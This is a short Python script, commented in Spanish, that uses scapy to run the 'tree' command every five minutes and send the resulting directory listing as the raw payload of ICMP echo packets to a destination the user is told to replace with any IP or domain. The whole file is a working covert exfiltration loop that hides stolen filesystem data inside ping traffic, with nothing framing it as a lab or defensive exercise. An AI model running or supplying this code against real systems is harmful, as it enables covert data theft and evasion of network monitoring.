#asko borobiltzeke eta pip, DockeFilera
pip install scapy


import subprocess
import time
from scapy.all import *

# Cambia este valor por la dirección IP o dominio al que quieras enviar el payload
destination = "127.0.0.1"  # Por ejemplo, localhost

while True:
    # Ejecutar el comando tree y guardar el resultado en tree.txt
    try:
        result = subprocess.check_output(['tree'], text=True)
        with open("tree.txt", "w") as file:
            file.write(result)
    except Exception as e:
        print(f"Error al ejecutar el comando tree: {e}")
        time.sleep(300)  # Espera 5 minutos y vuelve a intentar
        continue

    # Leer el contenido del archivo y enviar como payload en paquetes ICMP
    try:
        with open("tree.txt", "r") as file:
            payload = file.read()

        # Limitar el tamaño del payload si es necesario
        payload = payload[:1472]  # Tamaño máximo para un payload ICMP (normalmente 1472 bytes)

        # Enviar el paquete ICMP Echo Request
        packet = IP(dst=destination) / ICMP() / Raw(load=payload)
        send(packet)

        print(f"Enviado payload a {destination}: {payload}")

    except Exception as e:
        print(f"Error al enviar el payload: {e}")

    # Esperar 5 minutos
    time.sleep(300)